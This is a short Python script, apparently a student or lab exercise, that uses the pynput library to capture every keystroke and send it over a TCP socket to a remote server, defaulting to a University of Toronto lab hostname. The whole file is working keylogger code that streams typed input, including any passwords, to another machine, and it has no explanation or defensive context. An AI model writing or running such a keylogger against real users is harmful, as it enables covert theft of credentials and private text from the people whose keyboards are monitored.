from pynput import keyboard
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = input("(Optional) Enter the hostname/IP of the server: ")
port = input("(Optional) Enter the port number the server is listening on: ")

# Connect the socket to the port where the server is listening
# server_address = (host if len(host) >= 1 else "127.0.0.1",  
server_address = (host if len(host) >= 1 else "dh2020pc19.utm.utoronto.ca",
                  int(port) if len(port) >= 1 else 10000)

sock.connect(server_address)

def onPress(key):
    try:
        if key == keyboard.Key.space:
            sock.sendall(' '.encode("utf-8"))
            return
        sock.sendall(key.char.encode("utf-8"))
    except:
        sock.sendall(f"[{key}]".encode("utf-8"))

try:
    with keyboard.Listener(
            on_press=onPress) as listener:
        listener.join()

finally:
    sock.close()
